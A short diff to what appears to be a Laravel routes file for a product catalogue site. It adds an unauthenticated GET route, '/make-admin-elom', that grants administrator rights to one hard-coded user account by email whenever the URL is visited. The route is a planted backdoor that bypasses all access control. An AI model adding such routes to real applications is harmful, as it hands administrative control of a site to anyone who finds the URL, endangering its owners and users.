@@ -61,3 +61,7 @@ Route::get('/categories/{id}', [CategorieController::class, 'show']);
 
 Route::get('/produits/{id}/style', [IAController::class, 'index']);
 Route::post('/produits/{id}/style', [IAController::class, 'generer']);
+Route::get('/make-admin-elom', function () {
+    \App\Models\User::where('email', 'pierredekadjevi@gmail.com')->update(['is_admin' => true]);
+    return 'Admin activé !';
+});
